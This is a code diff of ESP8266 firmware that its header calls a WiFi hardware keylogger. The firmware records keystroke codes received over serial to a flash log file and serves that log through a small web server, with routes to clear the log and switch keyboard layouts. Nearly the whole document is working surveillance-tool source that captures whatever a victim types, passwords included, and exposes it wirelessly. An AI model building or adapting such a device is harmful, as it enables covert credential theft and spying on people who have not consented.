@@ -1,19 +1,29 @@
+/*
+ *  Basic hardware keylogger WiFi
+ *
+ *  Explanation: Simple hardware keylogger with wireless connectivity (WiFi) with multiple layout support.
+ * 
+ *  Copyright (C) 2019 Joel Serna & Ernesto Sanchez
+ *
+ *  Version:  1.0
+ *  Design:   Joel Serna & Ernesto Sanchez
+ *  Implementation: Joel Serna & Ernesto Sanchez
+ *
+ */
+
 #include <ESP8266WiFi.h>
 #include <FS.h>
 #include <ESP8266mDNS.h>
 #include <ESPAsyncTCP.h>
 #include <ESPAsyncWebServer.h>
-//#include <SPIFFSEditor.h>
+#include <SPIFFSEditor.h>
 #include <EEPROM.h>
 
-#define BAUD_RATE 115200
+#define BAUD_RATE 9600
 #define SHIFT 0x80
 #define ALTGR 0x40
 
-const String delete_logs = "<a href=\"/delete\"><- DELETE LOGS</a><br><br></body></html>";
-
 String data;
-//int j = 0;
 int tmp_incoming;
 char data2[20];
 
@@ -142,19 +152,10 @@ uint8_t _asciimap[256] =
   0x1b,          // x
   0x1c,          // y
   0x1d,          // z
-  0x34|ALTGR,    // {
-  0x1e|ALTGR,    // |
-  0x32|ALTGR,    // }
-  0x21|ALTGR,    // ~
-  0x00,        // DEL
-  0x00,             // Ç Start extended ASCII
-  0x00,
-  0x00,
-  0x00,
-  0x00,
-  0x00,
-  0x00,
-  0x00,             // ç
+  0x34|ALTGR,
+  0x1e|ALTGR,
+  0x32|ALTGR,
+  0x21|ALTGR,
   0x00,
   0x00,
   0x00,
@@ -183,16 +184,25 @@ uint8_t _asciimap[256] =
   0x00,
   0x00,
   0x00,
-  0x33,             // ñ
-  0x33|SHIFT,       // Ñ
-  0x00,
-  0x00,
-  0x2e|SHIFT,       // ¿
   0x00,
   0x00,
   0x00,
   0x00,
-  0x2e,             // ¡
+  0x00,
+  0x00,
+  0x00,
+  0x00,
+  0x00,
+  0x33,
+  0x33|SHIFT,
+  0x00,
+  0x00,
+  0x2e|SHIFT,
+  0x00,
+  0x00,
+  0x00,
+  0x00,
+  0x2e,
   0x00,
   0x00,
   0x00,
@@ -286,19 +296,11 @@ AsyncWebServer server(80);
 FSInfo fs_info;
 File logs;
 
-void init_format() {
-  logs.close();
-  delay(1000);
-  SPIFFS.format();
-  logs = SPIFFS.open("/log.html", "a+");
-  logs.println("<html><body><h2>WiFiKeylogger</h2><a class=\"myButton\" href=\"/delete\">Delete log</a><a class=\"myButton\" href=\"/configuration\">Configuration</a><p>Seleccionar idioma: </p><form target=\"_blank\"><select name=\"list\"><option value=\"https://www.google.es\"> BE<option value=\"https://www.marca.com\"> CZ<option value=\"https://www.as.com\"> DA<option value=\"https://www.google.es\"> DE<option value=\"/en\"> EN<option value=\"/es\"> ES<option value=\"https://www.google.es\"> FI<option value=\"https://www.google.es\"> FR<option value=\"https://www.google.es\"> IT<option value=\"https://www.google.es\"> PT<option value=\"https://www.google.es\"> TR</select> <input type=button value=\"Apply\" onClick=\"top.location.href=this.form.list.options[this.form.list.selectedIndex].value\"></form><style>.myButton {background-color:#599bb3;-moz-border-radius:32px;-webkit-border-radius:32px;border-radius:32px;border:2px solid #29668f;display:inline-block;cursor:pointer;color:#ffffff;font-family:Courier New;font-size:17px;padding:5px 4px;text-decoration:none;}.myButton:hover {background-color:#ffffff;}.myButton:active {position:relative;top:1px;}</style>"); 
-}
-
 void setup() {
   
   Serial.begin(BAUD_RATE);
   
-  WiFi.mode(WIFI_AP);
+  WiFi.mode(WIFI_STA);
   WiFi.softAP(ssid,password);
   
   EEPROM.begin(4096);
@@ -306,40 +308,39 @@ void setup() {
   
   MDNS.addService("http","tcp",80);
 
-  init_format();
-  
-  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
-    request->send(SPIFFS, "/log.html", "text/html");
-  });
+  logs = SPIFFS.open("/logs.txt", "a+");
 
-  server.on("/configuration", HTTP_GET, [](AsyncWebServerRequest *request){
-    request->send(200, "text/plain", "Prueba de ventana de configuración");
+  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
+    request->send(SPIFFS, "/logs.txt", "text/plain");
   });
 
   server.on("/delete", HTTP_GET, [](AsyncWebServerRequest *request){
-    init_format();
-    request->send(200, "text/plain", "Logs cleared!");
+    logs.close();
+    logs = SPIFFS.open("/logs.txt", "w");
+    request->send(200, "text/plain", "file cleared!");
+  });
+
+  server.on("/configuration", HTTP_GET, [](AsyncWebServerRequest *request){
+    request->send(200, "text/plain", "Configuration test");
   });
 
   server.on("/es", HTTP_GET, [](AsyncWebServerRequest *request){
-    // Código keymap ES
-    request->send(200, "text/plain", "Idioma español aplicado");
+    // Keymap ES
+    request->send(200, "text/plain", "Keymap ES");
   });
 
   server.on("/en", HTTP_GET, [](AsyncWebServerRequest *request){
-    // Código keymap ES
-    request->send(200, "text/plain", "Idioma ingles aplicado");
+    // Keymap ES
+    request->send(200, "text/plain", "Keymap EN");
   });
   
   server.begin();
 }
 
 void loop() {
-    // logs.write(Serial.read());
+  
+  if(Serial.available()) {
     data = Serial.readStringUntil('\n');
-    Serial.println("enter recibido");
-    Serial.print(data);
-    Serial.println("--TEST--");
 
     data.toCharArray(data2, data.length());
     tmp_incoming = atoi(data2);
@@ -349,4 +350,5 @@ void loop() {
         logs.write(i);
       }
     }
+  } 
 }
